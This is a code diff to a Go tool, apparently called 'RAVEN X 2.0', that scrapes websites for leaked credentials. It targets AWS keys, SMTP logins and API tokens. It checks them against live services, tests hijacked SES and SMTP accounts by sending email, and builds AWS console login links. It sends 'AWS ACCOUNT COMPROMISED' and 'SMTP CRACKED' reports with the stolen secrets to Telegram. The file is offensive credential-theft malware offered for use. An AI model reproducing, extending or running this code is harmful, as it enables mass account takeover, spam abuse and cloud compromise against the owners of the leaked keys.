 	var wg sync.WaitGroup
@@ -3753,46 +3473,26 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		{a.SlackBotTokenPattern, "Slack Bot Token"},
 		{a.SlackUserTokenPattern, "Slack User Token"},
 		{a.SlackWebhookPattern, "Slack Webhook"},
+		{a.DiscordBotTokenPattern, "Discord Bot Token"},
+		{a.DiscordWebhookPattern, "Discord Webhook"},
 		{a.CloudflareGlobalPattern, "Cloudflare Global"},
 		{a.DigitalOceanPATPattern, "DigitalOcean PAT"},
 		{a.SentryDSNPattern, "Sentry DSN"},
 		{a.NpmTokenPattern, "NPM Token"},
 		{a.PyPITokenPattern, "PyPI Token"},
 		{a.GitLabPATPattern, "GitLab PAT"},
+		{a.JWTPattern, "JWT"},
+		{a.PostmarkAPIKeyPattern, "Postmark Server Token"},
+		{a.MailjetAPIKeyPattern, "Mailjet API Key"},
 		{a.AWSSNSTopicARNPattern, "AWS SNS Topic ARN"},
 	}
 
 	for _, check := range nonValidatedChecks {
-		var rawKeys []string
-		if check.Pattern.NumSubexp() > 0 {
-			for _, m := range check.Pattern.FindAllStringSubmatch(contentToScan, -1) {
-				if len(m) > 1 && m[1] != "" {
-					rawKeys = append(rawKeys, m[1])
-				}
-			}
-		} else {
-			rawKeys = check.Pattern.FindAllString(contentToScan, -1)
-		}
-		// Drop matches that contain URL/HTML characters — page content, not credentials
-		var validKeys []string
-		for _, k := range rawKeys {
-			if !strings.ContainsAny(k, "./\"'<>(){}[]|\\") {
-				validKeys = append(validKeys, k)
-			}
-		}
-		keys := unique(validKeys)
+		keys := unique(check.Pattern.FindAllString(contentToScan, -1))
 		for _, key := range keys {
 			if _, loaded := a.KnownKeys.LoadOrStore(key, true); !loaded {
 				a.logFound(check.Name, key, sourceURL)
 				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), strings.ReplaceAll(check.Name, " ", "_")+"_found.txt")
-
-				displayKey := key
-				if len(displayKey) > 100 {
-					displayKey = displayKey[:100] + "..."
-				}
-				msg := a.tgHit("🔍", check.Name, sourceURL) + fmt.Sprintf(
-					"Value : %s\n", displayKey)
-				go a.sendTelegram(msg)
 
 				globalCounters.mu.Lock()
 				globalCounters.APIsFoundTotal++
@@ -3811,15 +3511,6 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		for _, ak := range sesKeys {
 			for _, sk := range sks {
 				if len(sk) == 40 {
-					// Reject URL-parameter false positives: real AWS secrets are random
-					// base64, never start with a word followed by '=' (e.g. "Signature=…")
-					if awsSkFPPattern.MatchString(sk) {
-						continue
-					}
-					// Reject degenerate access keys (e.g. AKIAAQAAAAAABQALACQA has AAAAAA run)
-					if hasRepeatedChar(ak[:16], 5) {
-						continue
-					}
 					keyPair := fmt.Sprintf("%s:%s", ak, sk)
 
 					// Gunakan KnownKeys untuk mencegah API call ganda dari goroutine yang berbeda
@@ -3964,66 +3655,8 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		}
 	}
 
-	// Mailjet: needs API key + secret key for Basic Auth
-	if a.Config.APIValidation.Mailjet {
-		apiKeys := make([]string, 0)
-		secretKeys := make([]string, 0)
-		for _, m := range a.MailjetAPIKeyPattern.FindAllStringSubmatch(contentToScan, -1) {
-			if len(m) > 1 {
-				apiKeys = append(apiKeys, m[1])
-			}
-		}
-		for _, m := range a.MailjetSecretKeyPattern.FindAllStringSubmatch(contentToScan, -1) {
-			if len(m) > 1 {
-				secretKeys = append(secretKeys, m[1])
-			}
-		}
-		for _, ak := range unique(apiKeys) {
-			for _, sk := range unique(secretKeys) {
-				a.logFound("Mailjet", fmt.Sprintf("%s:%s", ak, sk), sourceURL)
-				wg.Add(1)
-				validationSem <- struct{}{}
-				go func(k, s, u string) {
-					defer wg.Done()
-					defer func() { <-validationSem }()
-					a.CheckMailjet(k, s, u)
-				}(ak, sk, sourceURL)
-			}
-		}
-	}
-
-	// Plivo: needs auth ID + auth token for Basic Auth
-	if a.Config.APIValidation.Plivo {
-		authIDs := make([]string, 0)
-		authTokens := make([]string, 0)
-		for _, m := range a.PlivoAuthIDPattern.FindAllStringSubmatch(contentToScan, -1) {
-			if len(m) > 1 {
-				authIDs = append(authIDs, m[1])
-			}
-		}
-		for _, m := range a.PlivoAuthTokenPattern.FindAllStringSubmatch(contentToScan, -1) {
-			if len(m) > 1 {
-				authTokens = append(authTokens, m[1])
-			}
-		}
-		for _, aid := range unique(authIDs) {
-			for _, at := range unique(authTokens) {
-				a.logFound("Plivo", fmt.Sprintf("%s:%s", aid, at), sourceURL)
-				wg.Add(1)
-				validationSem <- struct{}{}
-				go func(id, t, u string) {
-					defer wg.Done()
-					defer func() { <-validationSem }()
-					a.CheckPlivo(id, t, u)
-				}(aid, at, sourceURL)
-			}
-		}
-	}
-
 	// Pengecekan SMTP menggunakan ScanningFeatures
 	a.extractAndTestSMTP(contentToScan, sourceURL)
-
-	a.extractAndSaveCryptoKeys(contentToScan, sourceURL)
 
 	// Ekstraksi menggunakan AST - hanya mengambil pola yang sesuai dengan regex yang sudah didefinisikan
 	a.extractValidatorsFromCode(contentToScan, sourceURL)
@@ -4387,7 +4020,7 @@ func (a *AWSScanner) ExploitSSRF(targetURL, sourceURL string) {
 
 // ExtractIPOnly - ekstrak hanya IP address dari URL atau teks
 func (a *AWSScanner) ExtractIPOnly(input string) []string {
-	ipPattern := regexp.MustCompile(`(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)`)
+	ipPattern := regexp.MustCompile(`\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b`)
 	ips := ipPattern.FindAllString(input, -1)
 
 	// Remove duplicates
@@ -4491,9 +4124,6 @@ func (a *AWSScanner) extractValidatorsFromCode(code, sourceURL string) {
 		a.logFound("SMTP (AST)", smtpLine, sourceURL)
 		a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_found.txt")
 
-		// Route to provider-specific API validator if host matches a known relay
-		a.routeProviderSMTP(host, user, pass, sourceURL)
-
 		// Test SMTP jika email target dikonfigurasi
 		if a.Config.SMTPTestEmail != "" {
 			a.testSMTPConnection(host, port, user, pass, from, sourceURL)
@@ -4583,9 +4213,6 @@ func (a *AWSScanner) extractSMTPFromMultipleFormats(code, sourceURL string) []ma
 		configs = append(configs, a.extractSMTPFromJSON(code)...)
 	}
 
-	// Format 0: Raw SMTP URLs (smtps://user:pass@host:port) — checked first
-	configs = append(configs, a.extractSMTPFromURL(code)...)
-
 	// Format 2: Environment Variables (.env style) - SAFE untuk semua file
 	configs = append(configs, a.extractSMTPFromEnv(code)...)
 
@@ -4660,41 +4287,34 @@ func (a *AWSScanner) extractSMTPFromEnv(code string) []map[string]string {
 	configs := []map[string]string{}
 	config := make(map[string]string)
 
-	hostRe := regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST|EMAIL_HOST|MAILER_HOST|SMTP_SERVER|MAIL_SERVER|SMTP_HOSTNAME|MAIL_MAILER_HOST)\s*=\s*["']?([^"'\s]+)["']?`)
-	portRe := regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT|EMAIL_PORT|MAILER_PORT|SMTP_PORT_NUMBER)\s*=\s*["']?(\d+)["']?`)
-	userRe := regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USER(?:NAME)?|MAILER_USERNAME|SMTP_LOGIN|MAIL_USER)\s*=\s*["']?([^"'\s]+)["']?`)
-	passRe := regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?|MAILER_PASSWORD|SMTP_SECRET)\s*=\s*["']?([^"'\s]+)["']?`)
-	fromRe := regexp.MustCompile(`(?i)(?:MAIL_FROM(?:_ADDRESS)?|SMTP_FROM|EMAIL_FROM(?:_ADDRESS)?|MAILER_FROM|SENDER_EMAIL|MAIL_SENDER|FROM_EMAIL)\s*=\s*["']?([^"'\s]+@[^"'\s]+)["']?`)
-
+	// Pattern untuk .env style
 	lines := strings.Split(code, "\n")
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
-		if strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") {
-			continue
+
+		// MAIL_HOST atau SMTP_HOST
+		if match := regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+			config["host"] = strings.Trim(match[1], `"'`)
 		}
-		if m := hostRe.FindStringSubmatch(line); len(m) > 1 && config["host"] == "" {
-			config["host"] = strings.Trim(m[1], `"'`)
+		// MAIL_PORT atau SMTP_PORT
+		if match := regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT)\s*=\s*["']?(\d+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+			config["port"] = match[1]
 		}
-		if m := portRe.FindStringSubmatch(line); len(m) > 1 && config["port"] == "" {
-			config["port"] = m[1]
+		// MAIL_USERNAME atau SMTP_USER
+		if match := regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER|SMTP_USERNAME)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+			config["user"] = strings.Trim(match[1], `"'`)
 		}
-		if m := userRe.FindStringSubmatch(line); len(m) > 1 && config["user"] == "" {
-			config["user"] = strings.Trim(m[1], `"'`)
+		// MAIL_PASSWORD atau SMTP_PASS
+		if match := regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS|SMTP_PASSWORD)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+			config["pass"] = strings.Trim(match[1], `"'`)
 		}
-		if m := passRe.FindStringSubmatch(line); len(m) > 1 && config["pass"] == "" {
-			config["pass"] = strings.Trim(m[1], `"'`)
-		}
-		if m := fromRe.FindStringSubmatch(line); len(m) > 1 && config["from"] == "" {
-			config["from"] = strings.Trim(m[1], `"'`)
+		// MAIL_FROM
+		if match := regexp.MustCompile(`(?i)(?:MAIL_FROM|MAIL_FROM_ADDRESS|SMTP_FROM)\s*=\s*["']?([^"'\s]+@[^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+			config["from"] = strings.Trim(match[1], `"'`)
 		}
 	}
 
-	// from can fall back to user if it looks like an email
-	if config["from"] == "" && strings.Contains(config["user"], "@") {
-		config["from"] = config["user"]
-	}
-
-	if len(config) >= 4 && config["host"] != "" && config["pass"] != "" {
+	if len(config) >= 5 {
 		configs = append(configs, config)
 	}
 
@@ -4850,88 +4470,6 @@ func (a *AWSScanner) extractSMTPByProximity(code string) []map[string]string {
 	return configs
 }
 
-// extractSMTPFromURL parses raw SMTP URLs: smtps://user@domain:pass@host:port
-// Handles email-format usernames (two @ chars) by splitting on the LAST @.
-func (a *AWSScanner) extractSMTPFromURL(code string) []map[string]string {
-	re := regexp.MustCompile(`(?i)(smtps?://[^\s"'<>]+)`)
-	var configs []map[string]string
-	for _, m := range re.FindAllString(code, -1) {
-		raw := m
-		secure := "No"
-		if strings.HasPrefix(strings.ToLower(raw), "smtps://") {
-			secure = "Yes"
-			raw = raw[len("smtps://"):]
-		} else {
-			raw = raw[len("smtp://"):]
-		}
-		// Port: last :digits
-		portRe := regexp.MustCompile(`:(\d{1,5})$`)
-		pm := portRe.FindStringSubmatchIndex(raw)
-		if pm == nil {
-			continue
-		}
-		port := raw[pm[2]:pm[3]]
-		raw = raw[:pm[0]]
-		// Host: after last @
-		lastAt := strings.LastIndex(raw, "@")
-		if lastAt < 0 {
-			continue
-		}
-		host := raw[lastAt+1:]
-		userpart := raw[:lastAt]
-		// User:pass — split on first colon
-		firstColon := strings.Index(userpart, ":")
-		if firstColon < 0 {
-			continue
-		}
-		user := userpart[:firstColon]
-		pass := userpart[firstColon+1:]
-		if host == "" || user == "" || pass == "" || port == "" {
-			continue
-		}
-		from := user // SMTP from = username by default
-		configs = append(configs, map[string]string{
-			"host": host, "port": port,
-			"user": user, "pass": pass,
-			"from": from, "secure": secure,
-		})
-	}
-	return configs
-}
-
-// routeProviderSMTP checks whether an extracted SMTP host belongs to a known
-// transactional-mail provider and, if so, validates the password (which is
-// usually the API key) via that provider's API.
-func (a *AWSScanner) routeProviderSMTP(host, user, pass, sourceURL string) {
-	h := strings.ToLower(host)
-	switch {
-	case strings.Contains(h, "smtp.sendgrid.net"):
-		// SendGrid: password IS the API key (username is always "apikey")
-		go a.CheckSendGrid(pass, sourceURL)
-	case strings.Contains(h, "smtp.mailgun.org") || strings.Contains(h, "smtp.eu.mailgun.org"):
-		// Mailgun: password is the API key (username is domain-specific user)
-		go a.CheckMailgun(pass, sourceURL)
-	case strings.Contains(h, "smtp.mandrillapp.com"):
-		// Mandrill: password is the API key
-		go a.CheckMandrill(pass, sourceURL)
-	case strings.Contains(h, "smtp.sparkpostmail.com"):
-		// SparkPost: password is the API key
-		go a.CheckSparkPost(pass, sourceURL)
-	case strings.Contains(h, "smtp-relay.brevo.com") || strings.Contains(h, "smtp-relay.sendinblue.com") || strings.Contains(h, "smtp.brevo.com"):
-		// Brevo/Sendinblue: password is the API key
-		go a.CheckBrevo(pass, sourceURL)
-	case strings.Contains(h, "smtp.postmarkapp.com"):
-		// Postmark: password is the server token
-		go a.CheckPostmark(pass, sourceURL)
-	case strings.Contains(h, "in-v3.mailjet.com"):
-		// Mailjet: username=API key, password=secret key
-		go a.CheckMailjet(user, pass, sourceURL)
-	case strings.Contains(h, "smtp.mailtrap.io") || strings.Contains(h, "live.smtp.mailtrap.io"):
-		// Mailtrap: password is the API token
-		go a.CheckMailtrap(pass, sourceURL)
-	}
-}
-
 // testSMTPConnection test koneksi SMTP yang ditemukan
 func (a *AWSScanner) testSMTPConnection(host, port, user, pass, from, sourceURL string) {
 	addr := fmt.Sprintf("%s:%s", host, port)
@@ -4956,9 +4494,17 @@ func (a *AWSScanner) testSMTPConnection(host, port, user, pass, from, sourceURL 
 			globalCounters.ValidSMTP++
 			globalCounters.mu.Unlock()
 
-			tlgMsg := a.tgHit("📬", "RANDOM SMTP", sourceURL) + fmt.Sprintf(
-				"Host : %s\nPort : %s\nUser : %s\nPass : %s\nFrom : %s\nSecure : No\n\n📋 SMTP URL\nsmtp://%s:%s@%s:%s\n",
-				host, port, user, pass, from, user, pass, host, port)
+			tlgMsg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+📨 <b>SMTP CRACKED (AST)</b>
+
+🖥️ <b>Host:</b> <code>%s</code>
+🔌 <b>Port:</b> <code>%s</code>
+👤 <b>User:</b> <code>%s</code>
+🔑 <b>Pass:</b> <code>%s</code>
+📧 <b>From:</b> %s
+🔗 <b>Source:</b> %s
+`, host, port, user, pass, from, sourceURL)
 			go a.sendTelegram(tlgMsg)
 			a.storeValidKeyLimit("SMTP", host, "Email Sent (AST)")
 		}
@@ -4986,7 +4532,7 @@ func (a *AWSScanner) handleValidAWS(ak, sk, st, sourceURL string, identity *sts.
 	sesInfo := a.checkSESDetailsAllRegions(cfg)
 	snsInfo := a.checkSNSLimitAllRegions(cfg)
 	fargateInfo := a.checkFargateOnDemandLimitAllRegions(cfg)
-	_ = a.getFederationConsoleURL(cfg, identity, 43200)
+	fedInfo := a.getFederationConsoleURL(cfg, identity, 43200)
 
 	// Coba kirim email via AWS SES
 	emailResult := a.SendEmailViaAWS(cfg, ak, sk, sourceURL)
@@ -5071,40 +4617,50 @@ func (a *AWSScanner) handleValidAWS(ak, sk, st, sourceURL string, identity *sts.
 
 	a.storeValidKeyLimit("AWS", ak, fmt.Sprintf("%.0f SES Limit / S3 Status: %s", maxQuota, s3Status))
 
+	consoleLink := "N/A"
+	if fedInfo != nil {
+		consoleLink = fmt.Sprintf("<a href='%s'>LOGIN CONSOLE</a>", fedInfo["federation_console_url"])
+	}
+
+	// Format report similar to main.py
+	reportMsg := strings.Join(reportLines, "\n")
+
+	emailStatus := "❌ Failed"
+	if emailResult["success"].(bool) {
+		emailStatus = fmt.Sprintf("✅ Success (From: %s, Region: %s)", emailResult["from_email"], emailResult["region"])
+	}
+
+	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+☁️ <b>AWS ACCOUNT COMPROMISED</b>
+
+👤 <b>User/Role:</b> <code>%s</code>
+🆔 <b>Account:</b> <code>%s</code>
+🔑 <b>Credentials:</b> <code>%s</code>
+🔗 <b>Console:</b> %s
+📦 <b>S3 Status:</b> %s
+🛡️ <b>IAM Audit:</b> %s
+📧 <b>Email Test:</b> %s
+
+<pre>%s</pre>
+
+<b>Quota & Limits (SES):</b>
+%s
+`, userOrRole, *identity.Account, keyLine, consoleLink, s3Status, iamAuditResult, emailStatus, reportMsg, sesDetails)
+
 	a.saveIntoFile(fmt.Sprintf("AWS %s SES: %+v SNS: %+v Fargate: %+v IAM Audit: %s", keyLine, sesInfo, snsInfo, fargateInfo, iamAuditResult), "aws_deep_scan.txt")
 
+	// Hanya kirim telegram jika:
+	// 1. Ada limit SES/SNS/Fargate yang terdeteksi DAN
+	// 2. Bisa mengirim email via SDK
 	hasLimits := len(sesInfo) > 0 || len(snsInfo) > 0 || len(fargateInfo) > 0
 	emailSuccess := emailResult["success"].(bool)
 
-	// Build plain-text AWS notification
-	awsDetails := fmt.Sprintf("Access Key : %s\nSecret Key : %s\n", ak, sk)
-	if len(allIdentities) > 0 {
-		awsDetails += fmt.Sprintf("Verified emails : %s\n", strings.Join(allIdentities, ", "))
-	}
-	if len(sesInfo) > 0 {
-		awsDetails += "📊 SES REGIONS (quota +200)\n"
-		for region, info := range sesInfo {
-			quota, _ := info["SendQuota"].(float64)
-			health, _ := info["HealthStatus"].(string)
-			status := "DISABLED"
-			if health != "" && health != "SUSPENDED" {
-				status = "HEALTHY"
-			}
-			awsDetails += fmt.Sprintf("%s (%s, %d/day)\n", region, status, int(quota))
-		}
-	} else {
-		awsDetails += "📊 SES REGIONS\nNone\n"
-	}
-	awsDetails += "📱 SNS REGIONS\nNone\n"
-
 	if hasLimits && emailSuccess {
-		msg := a.tgHit("🤴", "AWS AKIA", sourceURL) + awsDetails
 		go a.sendTelegram(msg)
-		pterm.Success.Printfln("[AWS NOTIF] Full Telegram for %s (SES + Email)", ak[:8]+"...")
+		pterm.Success.Printfln("[AWS NOTIF] Telegram sent for %s (Has Limits + Email Success)", ak[:8]+"...")
 	} else {
-		simpleMsg := a.tgHit("🤴", "AWS AKIA", sourceURL) + awsDetails
-		go a.sendTelegram(simpleMsg)
-		pterm.Warning.Printfln("[AWS NOTIF] Simplified Telegram for %s | Limits: %v | Email: %v", ak[:8]+"...", hasLimits, emailSuccess)
+		pterm.Warning.Printfln("[AWS SKIP] No Telegram for %s | Limits: %v | Email: %v", ak[:8]+"...", hasLimits, emailSuccess)
 	}
 }
 
@@ -5222,97 +4778,9 @@ func (a *AWSScanner) createRequest(domain string) {
 			}(path)
 		}
 
-		if a.Config.ScanningFeatures.GitHubTokenDeepScan { // Menggunakan flag baru
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				headURL := fmt.Sprintf("%s://%s/.git/HEAD", p, domain)
-				if r, e := client.Get(headURL); e == nil {
-					b, _ := ioutil.ReadAll(r.Body)
-					r.Body.Close()
-					if strings.Contains(string(b), "refs/heads") || strings.Contains(string(b), "ref: refs/") {
-						pterm.Warning.Printfln("[GIT EXPOSED] .git found on %s", domain)
-						configURL := fmt.Sprintf("%s://%s/.git/config", p, domain)
-						if rConf, eConf := client.Get(configURL); eConf == nil {
-							bConf, _ := ioutil.ReadAll(rConf.Body)
-							rConf.Body.Close()
-							a.checkAndSaveKeys(string(bConf), configURL)
-						}
-					}
-				}
-
-				gitURL := fmt.Sprintf("%s://%s/.git/config", p, domain)
-				if r, e := client.Get(gitURL); e == nil {
-					b, _ := ioutil.ReadAll(r.Body)
-					r.Body.Close()
-					a.checkAndSaveKeys(string(b), gitURL)
-				}
-			}()
-		}
-
 		wg.Wait()
 		return
 	}
-}
-
-func (a *AWSScanner) ProcessTokenList(filePath string) {
-	if !a.Config.ScanningFeatures.GitHubTokenDeepScan { // Pengecekan fitur baru
-		pterm.Error.Println("GitHub Token Deep Scan is disabled in config.json. Skipping token list processing.")
-		return
-	}
-
-	pterm.DefaultSection.Println("GitHub Token List Processor")
-
-	file, err := os.Open(filePath)
-	if err != nil {
-		pterm.Error.Printfln("Could not open token list file '%s': %v", filePath, err)
-		os.Exit(1)
-	}
-	defer file.Close()
-
-	var tokens []string
-	sc := bufio.NewScanner(file)
-	for sc.Scan() {
-		line := strings.TrimSpace(sc.Text())
-		if line != "" {
-			tokens = append(tokens, line)
-		}
-	}
-
-	if len(tokens) == 0 {
-		pterm.Warning.Println("No tokens found in the file.")
-		return
-	}
-
-	pterm.Info.Printfln("Loaded %d tokens for validation.", len(tokens))
-
-	globalCounters.URLsLoaded = len(tokens)
-
-	a.ProgressBar, _ = pterm.DefaultProgressbar.
-		WithTotal(len(tokens)).
-		WithTitle("Validating GitHub Tokens").
-		WithShowCount().
-		WithShowElapsedTime().
-		Start()
-
-	var wg sync.WaitGroup
-	// Batasi concurrent token validation
-	sem := make(chan struct{}, 100)
-
-	for _, token := range tokens {
-		wg.Add(1)
-		sem <- struct{}{}
-		go func(t string) {
-			defer wg.Done()
-			defer func() { <-sem }()
-			// CheckGitHubToken akan secara internal memeriksa flag deep scan
-			a.CheckGitHubToken(t, "Source: Token List File")
-			a.ProgressBar.Increment()
-		}(token)
-	}
-	wg.Wait()
-	a.ProgressBar.Stop()
-	pterm.Success.Println("Token validation complete.")
 }
 
 func (a *AWSScanner) DisplaySummary() {
@@ -5323,17 +4791,9 @@ func (a *AWSScanner) DisplaySummary() {
 		apiSuccessRate = float64(globalCounters.APIsValidated) / float64(globalCounters.APIsFoundTotal) * 100
 	}
 
-	tokenSuccessRate := 0.0
-	if globalCounters.TokensHarvested > 0 {
-		tokenSuccessRate = float64(globalCounters.TokensValidated) / float64(globalCounters.TokensHarvested) * 100
-	}
-
 	data := [][]string{
 		{"Metric", "Count", "Status"},
 		{"URLs Loaded", pterm.Cyan(globalCounters.URLsLoaded), ""},
-		{"Tokens Harvested", pterm.Yellow(globalCounters.TokensHarvested), ""},
-		{"Tokens Validated (GitHub)", pterm.Green(globalCounters.TokensValidated), pterm.Bold.Sprintf("(%.2f%% Success)", tokenSuccessRate)},
-		{"🔥 Deep Secrets Found (Mnemonic/GitScan)", pterm.FgLightRed.Sprint(globalCounters.CryptoKeysFound), "Surgical Precision"},
 		{"☁️ Valid AWS Keys", pterm.FgLightCyan.Sprint(globalCounters.AWSKeysValidated), "Deep Audit Success"},
 		{"Total API Keys Found", pterm.Magenta(globalCounters.APIsFoundTotal), ""},
 		{"API Keys Validated (Mail/SMS/Payment/AI/GCP)", pterm.Green(globalCounters.APIsValidated), pterm.Bold.Sprintf("(%.2f%% Success)", apiSuccessRate)},
@@ -5402,6 +4862,15 @@ func (a *AWSScanner) processBatch(urls []string) {
 			a.createRequest(url)
 			if a.ProgressBar != nil {
 				a.ProgressBar.Increment()
+			}
+			globalCounters.mu.Lock()
+			globalCounters.URLsProcessed++
+			processed := globalCounters.URLsProcessed
+			failed := globalCounters.URLsFailed
+			globalCounters.mu.Unlock()
+			if processed%50 == 0 {
+				statsData := fmt.Sprintf(`{"failed":%d,"processed":%d}`, failed, processed)
+				_ = os.WriteFile(filepath.Join("ResultJS", "crack_stats.json"), []byte(statsData), 0644)
 			}
 		}(u)
 	}
@@ -5473,9 +4942,6 @@ func main() {
 	flag.IntVar(&requestTimeoutSeconds, "timeout", 20, "Global timeout for each HTTP request in seconds.")
 	flag.IntVar(&batchSize, "batch", 500000, "Number of URLs to process per batch before forcing GC.")
 
-	var tokenListFile string
-	flag.StringVar(&tokenListFile, "tokenlist", "", "Path to a file containing a list of GitHub tokens (one per line).")
-
 	var ipOnlyMode bool
 	flag.BoolVar(&ipOnlyMode, "ip-only", false, "Extract only IP addresses from input and scan them.")
 
@@ -5485,12 +4951,6 @@ func main() {
 	listArgs := flag.Args()
 
 	scanner := NewAWSScanner(defaultConfigPath)
-
-	if tokenListFile != "" {
-		scanner.ProcessTokenList(tokenListFile)
-		scanner.DisplaySummary()
-		return
-	}
 
 	if len(listArgs) < 1 {
 		listFile = interactiveMode()
@@ -5556,6 +5016,5 @@ func main() {
 		f.Close()
 	}
 
-	scanner.seedKnownKeysFromResultJS()
 	scanner.runBatched(listFile)
 }
